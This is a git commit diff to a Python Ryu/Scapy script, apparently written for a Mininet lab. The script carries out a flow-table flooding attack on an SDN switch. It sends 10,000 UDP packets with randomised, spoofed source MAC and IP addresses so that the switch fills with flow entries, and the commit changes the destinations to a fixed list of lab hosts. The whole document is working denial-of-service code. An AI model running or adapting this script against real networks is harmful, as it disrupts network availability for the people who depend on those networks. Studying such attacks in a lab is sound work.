8704b31e7d02c811050a7d66a81617ab8978c8d2
AlexCast12 <jesusalexx12@gmail.com>
2024-10-24 01:13:45 -0600

    Se modifico el script de inundacion

--- Inundacion.py
+++ Inundacion.py
@@ -11,16 +11,12 @@ class FlowTableFloodingAttack(app_manager.RyuApp):
     def __init__(self, *args, **kwargs):
         super(FlowTableFloodingAttack, self).__init__(*args, **kwargs)
         self.mac_src = '00:00:00:00:00:01'
-        self.mac_dst = '00:00:00:00:00:02'
-        self.mac_dst = '00:00:00:00:00:03'
-        self.mac_dst = '00:00:00:00:00:04'
-        self.mac_dst = '00:00:00:00:00:05'
+        # Listas de múltiples direcciones MAC e IP para los destinos
+        self.mac_dst_list = ['00:00:00:00:00:02', '00:00:00:00:00:03', 
+                             '00:00:00:00:00:04', '00:00:00:00:00:05']
         self.ip_src = '10.0.0.1'
-        self.ip_dst = '10.0.0.2'
-        self.ip_dst = '10.0.0.3'
-        self.ip_dst = '10.0.0.4'
-        self.ip_dst = '10.0.0.5'
-        
+        self.ip_dst_list = ['10.0.0.2', '10.0.0.3', '10.0.0.4', '10.0.0.5']
+
     @set_ev_cls(ofp_event.EventOFPSwitchFeatures, MAIN_DISPATCHER)
     def switch_features_handler(self, ev):
         self.logger.info("Flooding the flow table with random packets")
@@ -29,14 +25,14 @@ class FlowTableFloodingAttack(app_manager.RyuApp):
     def flood_flow_table(self):
         for i in range(10000):  # Enviar 10,000 paquetes con diferentes direcciones IP
             random_mac_src = self.random_mac()
-            random_mac_dst = self.random_mac()
+            random_mac_dst = random.choice(self.mac_dst_list)  # Elegir MAC destino aleatoria
             random_ip_src = self.random_ip()
-            random_ip_dst = self.random_ip()
+            random_ip_dst = random.choice(self.ip_dst_list)  # Elegir IP destino aleatoria
 
             pkt = Ether(src=random_mac_src, dst=random_mac_dst) / \
                   IP(src=random_ip_src, dst=random_ip_dst) / \
                   UDP(sport=12345, dport=80)
-            sendp(pkt, iface="h1-eth0", verbose=False)  # Enviar por la interfaz de Mininet
+            sendp(pkt, iface="h1-eth0", verbose=False)  # Asegúrate de usar la interfaz correcta
 
     def random_mac(self):
         mac = [0x00, 0x16, 0x3e,
@@ -47,4 +43,3 @@ class FlowTableFloodingAttack(app_manager.RyuApp):
 
     def random_ip(self):
         return "10.0.%d.%d" % (random.randint(1, 254), random.randint(1, 254))
-    #cambio 1
